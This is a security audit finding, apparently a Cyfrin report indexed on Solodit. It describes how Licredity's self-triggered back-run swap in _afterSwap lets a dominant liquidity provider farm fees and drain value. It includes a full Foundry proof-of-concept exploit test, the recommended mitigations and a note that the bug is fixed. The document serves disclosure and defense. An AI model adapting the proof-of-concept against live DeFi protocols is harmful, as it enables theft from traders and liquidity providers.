---
tags:
  - lang/solidity
  - sector/dex
  - sector/lending
  - platform/cyfrin
  - has/github
  - has/poc
  - severity/high
  - impact/mev/backrun
protocol: "[[Licredity]]"
auditors:
  - "[[immeas]]"
report: "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-09-01-cyfrin-licredity-v2.0.md"
genome:
  - "[[missing-allowance]]"
  - "[[indirect-loss]]"
  - "[[backrun]]"
  - "[[frontrun-exposure]]"
---
# Self-triggered `[[Licredity]]::_afterSwap` back-run enables LP fee farming

- id: 62349
- impact: HIGH
- protocol: Licredity
- reporter: Immeas (Cyfrin)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-09-01-cyfrin-licredity-v2.0.md

## Summary


The bug report describes a vulnerability in the Licredity smart contract that allows a dominant liquidity provider (LP) to repeatedly mine fees without taking on much price risk. The bug allows the LP to push the price of an asset below 1 and then trigger a back-run swap that pays fees to the LP. The LP can then redeem their position at a 1:1 exchange rate, effectively extracting value from the system. This can be done repeatedly, causing a steady drain on the system's value. A proof of concept is provided, along with a recommended mitigation strategy. The bug has been fixed in the Licredity code. 

## Details

**Description:** When price hits or goes below 1, [`Licredity::_afterSwap`](https://github.com/Licredity/licredity-v1-core/blob/e8ae10a7d9f27529e39ca277bf56cef01a807817/src/Licredity.sol#L734-L753) auto back-runs a swap to push price up:
```solidity
if (sqrtPriceX96 <= ONE_SQRT_PRICE_X96) {
    // back run swap to revert the effect of the current swap, using exactOut to account for fees
    IPoolManager.SwapParams memory params =
        IPoolManager.SwapParams(false, -balanceDelta.amount0(), MAX_SQRT_PRICE_X96 - 1);
    balanceDelta = poolManager.swap(poolKey, params, "");
```
That back-run pays swap fees to LPs. An attacker who provides most of the liquidity around 1 can:

1. push price slightly below 1 with a swap and earn back their swap fees as LP fees,
2. trigger the hook’s back-run and earn LP fees again,
3. redeem via `Licredity::exchangeFungible` at \~1:1 (using `baseAmountAvailable` / `debtAmountOutstanding`),
   so they recover their principal while keeping both fee legs. This can be looped by the same account.


**Impact:** A dominant LP can repeatedly mine fees with low price risk, draining value from traders and the system’s stabilization logic. Over time this becomes a steady, repeatable extraction (economic drain) whenever the attacker can steer price just under 1.

**Proof of Concept:** Add the following test to `LicredityHook.t.sol`:
```solidity
function test_abuse_backswap_fees() public {
    address attacker = makeAddr("attacker");

    // fund attacker with ETH and mint some debt for LP positions
    vm.deal(attacker, 1000 ether);
    getDebtERC20(attacker, 50 ether);

    vm.startPrank(attacker);
    IERC20(address(licredity)).approve(address(uniswapV4Router), type(uint256).max);

    // 1) Attacker adds dominant narrow liquidity around parity on BOTH sides:
    //    below 1  -> captures fees while price dips (push leg + back-run leg)
    //    above 1  -> recoups the tiny portion of fees paid just above 1 when crossing
    int256 L_below = 40_000 ether;
    int256 L_above = 10_000 ether;

    // Record attacker balances before attack
    uint256 baseBefore = attacker.balance;
    uint256 debtBefore = IERC20(address(licredity)).balanceOf(attacker);

    // below 1: [-2, 0]
    uniswapV4RouterHelper.addLiquidity(
        attacker,
        poolKey,
        IPoolManager.ModifyLiquidityParams({
            tickLower: -2,
            tickUpper:  0,
            liquidityDelta: L_below,
            salt: ""
        })
    );

    // above 1: [0, +2]
    payable(address(uniswapV4Router)).transfer(1 ether);
    uniswapV4RouterHelper.addLiquidity(
        attacker,
        poolKey,
        IPoolManager.ModifyLiquidityParams({
            tickLower: 0,
            tickUpper: 2,
            liquidityDelta: L_above,
            salt: ""
        })
    );
    vm.stopPrank();

    // 2) Ensure starting price is a hair > 1 so we cross down through 1 on the push.
    //    Do a tiny oneForZero (debt -> base) to nudge price up.
    uniswapV4RouterHelper.oneForZeroSwap(
        attacker,
        poolKey,
        IPoolManager.SwapParams({
            zeroForOne: false,                        // debt -> base
            amountSpecified: int256(0.001 ether),     // exact-in (tiny)
            sqrtPriceLimitX96: TickMath.getSqrtPriceAtTick(3)
        })
    );
    {
        (uint160 sqrtP0,,,) = poolManager.getSlot0(poolKey.toId());
        assertGt(sqrtP0, ONE_SQRT_PRICE_X96, "price should start slightly > 1");
    }

    vm.startPrank(attacker);
    // 3) The attacker does the push: base -> debt (zeroForOne), exact-out debt,
    //    with a limit just below 1 so we do cross into price<=1 and trigger the hook’s back-run.
    int256 debtOut = 2 ether;
    for(uint256 i = 0 ; i < 1 ; i++) {
        payable(address(uniswapV4Router)).transfer(uint256(debtOut));
        uniswapV4RouterHelper.zeroForOneSwap(
            attacker,
            poolKey,
            IPoolManager.SwapParams({
                zeroForOne: true,                              // base -> debt
                amountSpecified: -debtOut,                     // exact-out debt
                sqrtPriceLimitX96: TickMath.getSqrtPriceAtTick(-3)
            })
        );
    }
    // hook's back-run (debt -> base, exact-out base) runs inside afterSwap

    // Price should be restored to >= 1 by the hook’s back-run
    {
        (uint160 sqrtP1,,,) = poolManager.getSlot0(poolKey.toId());
        assertGe(sqrtP1, ONE_SQRT_PRICE_X96, "post back-run price must be >= 1");
    }

    // 4) Pull the fees: remove BOTH attacker positions to collect base + debt fees.
    uniswapV4RouterHelper.removeLiquidity(
        attacker,
        poolKey,
        IPoolManager.ModifyLiquidityParams({
            tickLower: -2,
            tickUpper:  0,
            liquidityDelta: -L_below,
            salt: ""
        })
    );
    uniswapV4RouterHelper.removeLiquidity(
        attacker,
        poolKey,
        IPoolManager.ModifyLiquidityParams({
            tickLower: 0,
            tickUpper: 2,
            liquidityDelta: -L_above,
            salt: ""
        })
    );
    vm.stopPrank();

    // Attacker balances AFTER
    uint256 baseAfter = attacker.balance;
    uint256 debtAfter = IERC20(address(licredity)).balanceOf(attacker);

    // 5) Value both legs ~at parity (1 debt ~= 1 base). Because the price is ~1,
    //    this notional comparison is a good proxy for profit from the fee mining.
    uint256 notionalBefore = baseBefore + debtBefore;
    uint256 notionalAfter  = baseAfter  + debtAfter;

    // Expect positive drift from:
    //  - near-100% recoup of taker fees (attacker dominates both sides around 1)
    //  - plus back-run fees (paid in debt) captured below 1
    assertGt(notionalAfter, notionalBefore, "drain should be profitable when attacker dominates both sides");
    console.log("Profit from fee mining drain: %s", notionalAfter - notionalBefore);
}
```

**Recommended Mitigation:** Consider one of the following options:
1. Remove the back-run and revert swaps that would end below 1, or reject `sqrtPriceLimitX96` below 1.
2. Only allow whitelisted addresses to provide liquidity in ticks below 1.
3. Use dynamic fees in the hook and don't accrue fees for the back-run (i.e `sender == address(this)`).

**Licredity:** Fixed in [PR#61](https://github.com/Licredity/licredity-v1-core/pull/61/files) and [PR#78](https://github.com/Licredity/licredity-v1-core/pull/78/files), commits [`ddee552`](https://github.com/Licredity/licredity-v1-core/commit/ddee552ce5c1343ed0de1630776655f5313324bb), [`f10c969`](https://github.com/Licredity/licredity-v1-core/commit/f10c969621b2228bee0838ccf3fd597b8b51cef3), [`d8522f8`](https://github.com/Licredity/licredity-v1-core/commit/d8522f8a5b656791536bd87142b2a553ea0b8def), [`039eb4a`](https://github.com/Licredity/licredity-v1-core/commit/039eb4ab5f5c1775d889c9465dde39d22902f583), [`f818f33`](https://github.com/Licredity/licredity-v1-core/commit/f818f335a1f023cac450af4560baf1f0c75c1334), and [`0baca20`](https://github.com/Licredity/licredity-v1-core/commit/0baca209b1cfee61d92b0bde11a1cdf99d2436fe)

**Cyfrin:** Verified. Swaps with a price ending up below 1 now reverts. `exchangeFungible` also changed to always provide a 1:1 exchange rate, as long as there is an exchangeable amount in the contract.
